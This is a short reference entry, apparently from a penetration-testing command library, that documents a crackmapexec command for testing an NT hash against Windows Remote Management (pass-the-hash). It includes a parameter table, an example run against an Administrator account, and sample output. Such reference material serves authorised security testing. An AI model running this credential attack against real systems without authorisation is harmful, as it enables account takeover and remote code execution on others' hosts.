---
id: b71c12e7-e392-42fd-8f41-6a2d2ad14836
type: command
executor: bash
data: 'crackmapexec winrm $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"'
output: null
created_at: '2023-04-06T03:56:30.721764+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - winrm
verified: true
validated: true
---

# crackmapexec-winrm-with-nt-hash

## Command

```bash
crackmapexec winrm $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

## Description

Validates NT hash for WinRM (Windows Remote Management) to enable remote PowerShell execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| -u $_USERNAME | WinRM username | Yes |
| -H ":$_NT_HASH" | NT hash | Yes |
| winrm | WinRM protocol (ports 5985/5986) | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

## Expected Output

Success:

WINRM               192.168.1.100:5985    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [+] (corp\administrator:31d6cfe0d16ae931b73c59d7e0c089c0)

Failure:

WINRM               192.168.1.100:5985    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [-] HTTP 401

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
